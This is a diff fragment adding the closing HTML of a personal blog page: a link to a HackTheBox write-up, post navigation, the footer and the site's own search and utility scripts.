+<li><a rel="noopener external" target="_blank" href="https://0xdf.gitlab.io/2025/04/12/htb-linkvortex.html">HTB: LinkVortex | 0xdf hacks stuff</a></li>
+</ul>
+
+    
+<nav class="site-prev-next" aria-label="More posts"><a href="https://shengtuo.me/blog/shell-upgrade/">← Older: Shell Upgrade</a><a href="https://shengtuo.me/blog/htb/editorial/">Newer: Editorial →</a>
+</nav>
+
+  </article>
+</main>
+
+  <footer class="f-footer"><div class="f-footer__cats" aria-hidden="true"></div>
+  <ul class="f-social site-footer-social" aria-label="Elsewhere">
+    <li><a class="f-social__link" href="https://github.com/h1994st" rel="me noopener"><span class="f-icon f-icon--github" aria-hidden="true"></span><span class="f-visually-hidden">GitHub</span></a></li>
+    <li><a class="f-social__link" href="https://scholar.google.com/citations?user=VOefXMMAAAAJ" rel="me noopener"><span class="f-icon f-icon--google-scholar" aria-hidden="true"></span><span class="f-visually-hidden">Google Scholar</span></a></li>
+    <li><a class="f-social__link" href="https://www.linkedin.com/in/shengtuo/" rel="me noopener"><span class="f-icon f-icon--linkedin" aria-hidden="true"></span><span class="f-visually-hidden">LinkedIn</span></a></li>
+    <li><a class="f-social__link" href="https://x.com/ShengtuoHu" rel="me noopener"><span class="f-icon f-icon--x" aria-hidden="true"></span><span class="f-visually-hidden">X</span></a></li>
+    <li><a class="f-social__link" href="https://www.instagram.com/hst_nullderef/" rel="me noopener"><span class="f-icon f-icon--instagram" aria-hidden="true"></span><span class="f-visually-hidden">Instagram</span></a></li>
+  </ul>
+  <p class="site-footer-links"><a href="https://shengtuo.me/blog/">Blog</a> · <a href="https://shengtuo.me/notebook/">Notebook</a> · <a href="https://shengtuo.me/misc/">Misc.</a> · 
+    <a href="https://shengtuo.me/atom.xml">Feed</a>
+  </p>
+  <p>© 2026 Shengtuo Hu</p>
+</footer>
+
+  <dialog class="f-sheet" id="site-search" aria-label="Search" data-index="https://shengtuo.me/search_index.en.json">
+  <div class="f-sheet__panel">
+    <input class="f-input f-search" type="search" placeholder="Search posts and notes" aria-label="Search" autocomplete="off" />
+    <p class="f-meta site-search-status" role="status"></p>
+    <ol class="site-search-results"></ol>
+  </div>
+</dialog>
+<script type="module" src="https://shengtuo.me/js/site/search.js"></script>
+
+  
+  <script type="module" src="https://shengtuo.me/vendor/facet/dist/js/facet.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/cats.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/code-copy.js"></script><script type="module" src="https://shengtuo.me/js/site/share.js"></script>
+
+</body>
+</html>
